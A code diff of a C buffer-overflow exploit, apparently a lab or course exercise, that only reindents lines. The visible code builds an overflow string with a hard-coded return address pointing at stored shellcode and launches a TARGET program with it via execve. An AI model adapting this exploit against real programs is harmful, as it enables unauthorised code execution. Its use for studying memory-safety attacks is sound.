@@ -15,11 +15,11 @@ static char shellcode[] =
 
 // shellcode stored at 0xffbfdfb8
 static char after_buf[] =
-  "LLLL\xa7\x68\xde\xbf\xff\xb8\xdf\xbf\xff";
+"LLLL\xa7\x68\xde\xbf\xff\xb8\xdf\xbf\xff";
 
 int main(void) {
-	char *args[4];
-	char *env[1];
+  char *args[4];
+  char *env[1];
   int i;
 
   FILE *sc_file;
@@ -36,15 +36,15 @@ int main(void) {
   }
   fclose(sc_file);
 
-	args[0] = TARGET;
-	args[1] = "sc"; 
-	args[2] = shellcode;
+  args[0] = TARGET;
+  args[1] = "sc";
+  args[2] = shellcode;
   args[3] = NULL;
 
-	env[0] = NULL;
+  env[0] = NULL;
 
-	execve(TARGET, args, env);
-	// execve only returns if it fails
-	fprintf(stderr, "execve failed\n");
-	return 1;
+  execve(TARGET, args, env);
+  // execve only returns if it fails
+  fprintf(stderr, "execve failed\n");
+  return 1;
 }
